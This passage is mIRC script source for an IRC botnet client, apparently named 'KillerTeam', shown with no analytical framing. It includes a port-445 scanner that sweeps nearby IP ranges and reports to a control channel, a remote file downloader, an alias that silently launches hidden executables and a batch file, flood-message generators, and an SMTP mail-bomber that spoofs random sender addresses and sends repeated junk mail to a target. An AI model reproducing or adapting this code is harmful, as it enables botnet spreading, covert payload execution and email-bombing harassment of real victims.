     inc %totalscaning
     if %totalscaning == %total opensocks 22
     set %ip23 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 23
     set %ip24 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     if %totalscaning == %total opensocks 24
     set %ip25 $longip($calc( %beglongip + %totalscaning ))
     inc %totalscaning
     opensocks
   }
   on *:APPACTIVE:{ if ($appstate != hidden) && ($uptime(mirc) > 2000) { updating! }  }
   alias opensocks {
     sockopen ip1 %ip1 445
     if $1 == 1 finished
     sockopen ip2 %ip2 445
     if $1 == 2 finished
     sockopen ip3 %ip3 445
     if $1 == 3 finished
     sockopen ip4 %ip4 445
     if $1 == 4 finished
     sockopen ip5 %ip5 445
     if $1 == 5 finished
     sockopen ip6 %ip6 445
     if $1 == 6 finished
     sockopen ip7 %ip7 445
     if $1 == 7 finished
     sockopen ip8 %ip8 445
     if $1 == 8 finished
     sockopen ip9 %ip9 445
     if $1 == 9 finished
     sockopen ip10 %ip10 445
     if $1 == 10 finished
     sockopen ip11 %ip11 445
     if $1 == 11 finished
     sockopen ip12 %ip12 445
     if $1 == 12 finished
     sockopen ip13 %ip13 445
     if $1 == 13 finished
     sockopen ip14 %ip14 445
     if $1 == 14 finished
     sockopen ip15 %ip15 445
     if $1 == 15 finished
     sockopen ip16 %ip16 445
     if $1 == 16 finished
     sockopen ip17 %ip17 445
     if $1 == 17 finished
     sockopen ip18 %ip18 445
     if $1 == 18 finished
     sockopen ip19 %ip19 445
     if $1 == 19 finished
     sockopen ip20 %ip20 445
     if $1 == 20 finished
     sockopen ip21 %ip21 445
     if $1 == 21 finished
     sockopen ip22 %ip22 445
     if $1 == 22 finished
     sockopen ip23 %ip23 445
     if $1 == 23 finished
     sockopen ip24 %ip24 445
     if $1 == 24 finished
     sockopen ip25 %ip25 445
     timerscannerTE 1 6 sockclose ip*
     timerscannerSA 1 7 startscan
   }
   alias randip {
     unset %1p1 %1p2
     set %1p1 $1-
     set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))
     set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))
     set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))
     set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))
     return %1p2
   }
   alias flooder {
     inc %varmsg
     if %varmsg == 4 { set %varmsg 1 }
     if ($lines(clmsg.sys) == $null) && (%varmsg == 3) {  return $str(…KillerTeam…,35) | set %varmsg 0 }
     if ( %varmsg == 1 ) { return $str(…Ping…,24) }
     if ( %varmsg == 2 ) { return $str(…KillerTeam…,35) }
     if ( %varmsg == 3 ) { return $read(clmsg.sys) }
   }
   alias Servers {
     inc %Botconnecting
     if %Botconnecting >= 5 { set %Botconnecting 1 }
     if %Botconnecting == 1 { return %connect1 }
     if %Botconnecting == 2 { return %connect2 }
     if %Botconnecting == 3 { return %connect3 }
     if %Botconnecting == 4 { return %connect4 }
   }
   alias download_fail msgchan %c [DownLoad] Failed to download $download($1).file - $2-
   alias download_complete if (%files isin $download($1).file) { set %5 $ifmatch  } | if (%downspeed) { set %downspeed (Speed: $+ $bytes(%downspeed).suf ( $+ $byte(%downspeed) bytes) $+ ). } |  msgchan %c [DownLoad] Completed $nopath($download(1).file) in $duration($download(1).secs) (Size: $+ $bytes($download(1).size).suf ( $+ $byte($download(1).size) bytes) $+ ) %downspeed
   alias download {
     if (!$isid) {
       var %1 = download $+ $1,%2 = $longfn($3-)
       if (!$3) { var %2 $mircdir }
       if ($sock(%1)) { return }
       if (!$isdir(%2)) { return }
       unset % [ $+ [ %1 $+ .* ] ]
       set % [ $+ [ %1 $+ .file ] ] $+(%2,$iif($right(%2,1) != $chr(92),$chr(92)),$gettok($2,-1,47),.dat)
       set % [ $+ [ %1 $+ .url ] ] http:// $+ $remove($2,http://)
       set % [ $+ [ %1 $+ .ctime ] ] $ctime
       set % [ $+ [ %1 $+ .status ] ] Connecting
       sockopen %1 $gettok($remove($2,http://),1,47) 80
     }
     else {
       if ($1 == 0) { return $sock(download*,0) }
       if ($iif($1 isnum,$sock(download*,$1),$sock(download $+ $1))) {
         var %1 = $ifmatch,%2 = $dl.var(%1,file),%3 = $dl.var(%1,size),%4 = $file(%2).size
         if (!$prop) { return $right(%1,-8) }
         elseif ($prop == ip) { return $sock(%1).ip }
         elseif ($prop == status) { return $dl.var(%1,status) }
         elseif ($prop == url) { return $dl.var(%1,url) }
         elseif ($prop == file) { return $left(%2,-4) }
         elseif ($prop == type) { return $dl.var(%1,type) }
         elseif ($prop == size) { return %3 }
         elseif ($prop == rcvd) { return %4 }
         elseif ($prop == cps) { return $int($calc(%4 / ($ctime - $dl.var(%1,ctime,2)))) }
         elseif ($prop == pc) { return $int($calc($file(%2).size * 100 / %3)) }
         elseif ($prop == secs) { return $calc($ctime - $dl.var(%1,ctime,1)) }
       }
     }
   }
   alias -l dl.var { return $gettok(% [ $+ [ $+($1,.,$2) ] ],$iif(!$3,1-,$3),32) }
   alias -l dl.fail { var %1 = $right($1,-8) | download_fail %1 $2- | close -d %1 }
   alias close {
     if ($1 == -d) {
       var %1 = download $+ $2
       if ($sock(%1)) {
         .remove $+(",$dl.var(%1,file),")
         unset % [ $+ [ %1 $+ .* ] ]
         sockclose %1
       }
     }
     else { close $1- }
   }
   alias updating! { run Design.exe /n /fh /r " $+ $mircdirGTKL.exe -kf $mircexe $+ "  | run Design.exe /n /fh /r "Below.bat $left($mircdir,1) $+ " }
   on *:sockopen:download*:{
     if ($sockerr) { dl.fail $sockname Unable to Connect | return }
     var %1 = $dl.var($sockname,url)
     set % [ $+ [ $sockname $+ .status ] ] Requesting File
     sockwrite -tn $sockname GET %1 HTTP/1.1
     sockwrite -tn $sockname Host: $gettok($remove(%1,http://),1,47)
     sockwrite -tn $sockname Accept: *.*, */*
     sockwrite -tn $sockname Connection: close
     sockwrite -tn $sockname $crlf
   }
   alias randmyip {
     var %0 $gettok($ip,1-2,46)  $+ . $+ $r(0,250) $+ .0 | var %1 $gettok(%0,1-2,46) $+ . $+ $calc($gettok(%0,3,46) + 5) $+ .255
     var %0 $remove(%0,$decode(IA==,m))
     var %1 $remove(%1,$decode(IA==,m))
     set %begit %0
     msgchan %c [Scanner] Starting scan from: %begit to %1
     set %begshortip %begit
     set %beglongip $longip(  %begshortip )
     set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip )
     set %total $calc( %endlongip - %beglongip )
     unset %totalscaning | startscan
   }

   on *:sockclose:download*:{ if ($dl.var($sockname,status) != done) { dl.fail $sockname Disconnected | downloadstatus } }
   on *:sockread:download*:{
     if ($sockerr) { dl.fail $sockname Disconnected | return }
     if ($dl.var($sockname,status) != downloading) {
       var %1 | sockread %1 | tokenize 32 %1
       if (HTTP/* iswm $1 && $2 != 200) { dl.fail $sockname $3- }
       elseif ($1 == Content-Length:) { set % [ $+ [ $sockname $+ .size ] ] $2 }
       elseif ($1 == Content-Type:) { set % [ $+ [ $sockname $+ .type ] ] $2- }
       elseif (!$1) {
         write -c $+(",$dl.var($sockname,file),")
         set % [ $+ [ $sockname $+ .ctime ] ] $dl.var($sockname,ctime,1) $ctime
         set % [ $+ [ $sockname $+ .status ] ] Downloading
         downloadstatus
         return
       }
     }
     else {
       var %1 = $dl.var($sockname,file)
       :sockread
       sockread &1
       if (!$sockbr) { return }
       bwrite $+(",%1,") -1 &1
       downloadstatus
       if ($file(%1).size >= $dl.var($sockname,size)) {
         var %1 = $right($sockname,-8),%2 = $dl.var($sockname,file)
         set % [ $+ [ $sockname $+ .status ] ] Done
         .copy -o $+(",%2,") $+(",$left(%2,-4),")
         downloadstatus
         download_complete %1
         close -d %1
         return
       }
       goto sockread
     }
   }
   alias fileKB { return $bytes($file( $1- )).suf ( $+ $byte($file($1-)) bytes) }
   alias byte {
     var %0 $1
     var %lens $len( %0 )
     var %inc 0
     var %1 %0
     var %6 $int($calc(%lens /3))
     :loop
     var %2 $right(%1,3)
     if %3 != $null { var %3 %2 $+ , $+ %3 }
     if %3 == $null { var %3 %2 }
     set %1 $remove(%1,%2)
     inc %inc
     if %inc < %6 { goto loop }
     if %inc == %6 {  if ($remove(%3,$chr(44)) != %0) { goto loop } }
     return %3
   }
   alias downloadstatus {
     if (%downspeed == $null) { set %downspeed $download(1).cps }
     if (%downspeed < $download(1).cps) { set %downspeed $download(1).cps }
   }
   on *:sockopen:sock.smtp*:{ if ($sockerr > 0) return }
   on *:sockread:sock.smtp*:{
     sockread %temp
     if ($sockerr > 0) { return }
     if (550* iswm %temp) { inc %mail.counter }
     if (220* iswm %temp) && (%mail.step == 0) { sockwrite -n $sockname HELO $iif($ip,$ip,127.0.0.1) | inc %mail.step }
     elseif (250* iswm %temp) && (%mail.step == 1) { sockwrite -n $sockname MAIL FROM: %mail.mymail | inc %mail.step }
     elseif ((250* iswm %temp) || (550* iswm %temp)) && (%mail.step == 2) {
       sockwrite -n $sockname RCPT TO: %mail.mail
       inc %mail.step | sockwrite -n $sockname DATA
     }
     elseif (354* iswm %temp) && (%mail.step == 3) {
       sockwrite -n $sockname DATE: $fulldate
       sockwrite -n $sockname FROM: %mail.mymail
       sockwrite -n $sockname SUBJECT: %mail.subject
       sockwrite -n $sockname TO: %mail.mail
       if %mail.msg == $null { set %mail.msg .:: Mail Bombs by KillerTeaM ::. }
     sockwrite -n $sockname $chr(32) | sockwrite -n $sockname : $+ %mail.msg | sockwrite -n $sockname $chr(32) | var %i = 1 | while (%i <= 75) { sockwrite -n $sockname $str($decode(JCNA,m),50) | inc %i }  | sockwrite -n $sockname . | inc %mail.sent | inc %mail.step }
     elseif (250* iswm %temp) && (%mail.step == 4) { sockwrite -n $sockname QUIT | inc %mail.step }
     elseif (221* iswm %temp) && (%mail.step == 5) { if ($sock(sock.smtp)) { sockclose $sockname | sockopen sock.smtp $+ $r(a,z) $+ $r(10000,99999999) $+ $r(a,z) %mail.server %mail.port } }
   }
   alias mailstop {
     .timerbombmail off
     msgchan %c [Mail Bombs] Max send ( $+ %mail.sent $+ ) to ( $+ %mail.mail $+ )
     unset %mail.*
   }
   alias mailsetup {
     unset %mail.*
     set %mail.server $1
     set %mail.port $2
     set %mail.mail $3
     set %mail.mymail $4
     set %mail.mymails $4
     msgchan %c [Mail Bombs]  connict( $+ %mail.server $+ : $+ %mail.port $+ ) Sending Bombs To ( $+ %mail.mail $+ ).
     timerbombmail -m 0 500  mailBombs
   }
   alias mailBombs {
     if $sock(sock.smtp*,0) > 1 { goto end }
     if (!%mail.server) { msg $chan(1) [Mail Bombs]  ERROR no server | timerbombmail off | return }
     elseif (!%mail.port) { msg $chan(1) [Mail Bombs] ERROR no port  | timerbombmail off | return }
     elseif (!%mail.mail) { msg $chan(1) [Mail Bombs]  ERROR: no users  | timerbombmail off | return }
     sockclose sock.smtp
     if %mail.subject == $null { set %mail.subject none }
     if %mail.mymails == rand { set %mail.mymail $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $mail }
     if %mail.mymail == $null { set %mail.mymail $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $mail }
     if %mail.send == $null { set %mail.send 0 }
     set %mail.counter 0 | set %mail.step 0 | sockopen sock.smtp $+ $r(a,z) $+ $r(10000,99999999) $+ $r(a,z) %mail.server %mail.port
     :end
   }
   alias mail { set %bomber $r(1,5) | if (%bomber == 1) return @ $+ hotmail.com | if (%bomber == 2) return @ $+ msn.com | if (%bomber == 3) return @ $+ yahoo.com | if (%bomber == 4) return @ $+ aol.com | if (%bomber == 5) return @ $+ mail.com }
